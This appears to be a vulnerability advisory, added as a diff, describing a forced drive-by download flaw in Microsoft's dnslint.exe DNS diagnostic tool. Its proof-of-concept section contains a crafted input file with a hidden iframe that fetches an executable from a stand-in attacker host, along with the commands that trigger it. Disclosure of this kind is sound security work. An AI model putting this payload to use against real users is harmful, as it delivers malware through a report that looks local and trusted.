@@ -1,0 +1,101 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-DNSLINT.EXE-FORCED-DRIVE-BY-DOWNLOAD.txt
+[+] ISR: Apparition Security          
+
+
+***Greetz: indoushka | Eduardo***  
+
+
+Vendor
+=================
+www.microsoft.com
+
+
+Product
+===========
+dnslint.exe - DNS Tool
+
+
+DNSLint is a Microsoft Windows CL utility that helps you to diagnose common DNS name resolution issues.
+The utility not installed by default on Windows and must be downloaded from microsoft website.
+
+
+
+Vulnerability Type
+===================
+Forced Drive-by Download
+
+
+
+Security Issue
+================
+The tool doesn't verify domain names when parsing DNS text-files using the "/ql" switch making it prone to forced drive-by
+downloads, providing an end user is tricked into using a server text-file containing a script/binary reference instead of
+a normally expected domain name.
+
+Normal usage:
+(/r flag generates a report)
+dnslint.exe /v /y /d somedomain.com /s X.X.X.X /r myreport
+
+Unintended consequence usage:
+dnslint.exe /v /y /d "MALWARE-FILE" /s X.X.X.X /r "myreport"
+
+This potentially allows forced downloading of a remote executable to end users host when the report is veiwed in a web browser.
+Because the download "seemingly" comes from a "trusted" LOCAL location, an end user may "trust" it and ignore Security warnings
+normally associated with opening executables from their browser.
+
+e.g.
+
+The generated report is referenced as Local URI e.g. file:///c:/myreport.html and doesn't visibly point at some remote URL.
+
+
+Exploit/POC
+============
+double slashes required "//" to deal with "spaces" or will break injection.
+where X.X.X.X is the DNS server IP or use 8.8.8.8 (google DNS), ADVERSARY-IP (attacker IP).
+
+1) "dnslint-update.exe" on remote web server root dir.
+
+
+2) "servers.txt"
+
+DNSLint
+;This is a sample DNSLint input file
+
++This DNS server is called: dns1.cp.msft.net
+[dns~server] X.X.X.X
+
+<iframe//src="http://ADVERSARY-IP/dnslint-update.exe"//style="width:0;height:0;border:0;border:none;"></iframe>,a,r ;A record
+X.X.X.X,ptr,r ;PTR record
+test1,cname,r ;CNAME record
+test2,mx,r ;MX record
+
+
+3) dnslint.exe /ql servers.txt
+
+
+BOOOOOOOM Malwarez dropped :)
+Optionally, you can point dnslint.exe at a Network share file: \\ADVERSARY-IP\servers.txt
+
+
+Network Access
+===============
+Remote
+
+
+Severity
+=========
+High 7.6
+CVSS:3.0/AV:N/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
